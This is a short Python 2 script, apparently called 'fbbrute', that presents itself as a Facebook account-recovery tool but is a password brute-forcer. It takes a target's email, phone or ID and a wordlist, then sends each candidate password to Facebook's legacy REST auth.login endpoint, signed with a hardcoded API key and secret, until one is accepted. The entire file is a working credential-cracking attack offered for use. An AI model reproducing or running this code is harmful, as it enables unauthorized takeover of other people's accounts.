# -*- coding: utf-8 -*-
##
import os
import sys
import urllib
import hashlib
os.system("clear")
API_SECRET = "62f8ce9f74b12f84c123cc23437a4a32"

__banner__ = """


		  █████▒▄▄▄▄         ██▀███  ▓█████  ▄████▄   █    ██  ██▓███  
		▓██   ▒▓█████▄      ▓██ ▒ ██▒▓█   ▀ ▒██▀ ▀█   ██  ▓██▒▓██░  ██▒
		▒████ ░▒██▒ ▄██     ▓██ ░▄█ ▒▒███   ▒▓█    ▄ ▓██  ▒██░▓██░ ██▓▒
		░▓█▒  ░▒██░█▀       ▒██▀▀█▄  ▒▓█  ▄ ▒▓▓▄ ▄██▒▓▓█  ░██░▒██▄█▓▒ ▒
		░▒█░   ░▓█  ▀█▓ ██▓ ░██▓ ▒██▒░▒████▒▒ ▓███▀ ░▒▒█████▓ ▒██▒ ░  ░
		 ▒ ░   ░▒▓███▀▒ ▒▓▒ ░ ▒▓ ░▒▓░░░ ▒░ ░░ ░▒ ▒  ░░▒▓▒ ▒ ▒ ▒▓▒░ ░  ░
		 ░     ▒░▒   ░  ░▒    ░▒ ░ ▒░ ░ ░  ░  ░  ▒   ░░▒░ ░ ░ ░▒ ░     
		 ░ ░    ░    ░  ░     ░░   ░    ░   ░         ░░░ ░ ░ ░░       
		        ░        ░     ░        ░  ░░ ░         ░              
		             ░   ░                  ░                          
	     =========================BY:Tr4cKm4N=============================
"""
print(__banner__)
print("    [+]RECUPERA TU CUENTA DE FACEBOOK\n")
userid = raw_input("    [+] Enter [Email|N°Telefono|NombreUsuario|ID]: ")
try:
	passlist = raw_input("[*] Establer la ruta: ")
	if os.path.exists(passlist) != False:
		print(__banner__)
		print(" [+] Account to crack : {}".format(userid))
		print(" [+] Loaded : {}".format(len(open(passlist,"r").read().split("\n"))))
		print(" [+] Verificando,!Por favor espere¡ ...")
		for passwd in open(passlist,'r').readlines():
			sys.stdout.write(u"\u001b[1000D[*] Trying {}".format(passwd.strip()))
			sys.stdout.flush()
			sig = "api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail={}format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword={}return_ssl_resources=0v=1.0{}".format(userid,passwd.strip(),API_SECRET)
			xx = hashlib.md5(sig).hexdigest()
			data = "api_key=882a8490361da98702bf97a021ddc14d&credentials_type=password&email={}&format=JSON&generate_machine_id=1&generate_session_cookies=1&locale=en_US&method=auth.login&password={}&return_ssl_resources=0&v=1.0&sig={}".format(userid,passwd.strip(),xx)
			response = urllib.urlopen("https://api.facebook.com/restserver.php?{}".format(data)).read()
			if "error" in response:
				pass
			else:
				print("\n\n[+] Contraseña Encontrada .. !!")
				print("\n[+] Contraseña: {}".format(passwd.strip()))
				break
		print("\n\n[!] Done .. !!")
	else:
		print("fbbrute: error:El directorio o el fichero no existe")
except KeyboardInterrupt:
	print("fbbrute: error: Interrupcion de teclado")
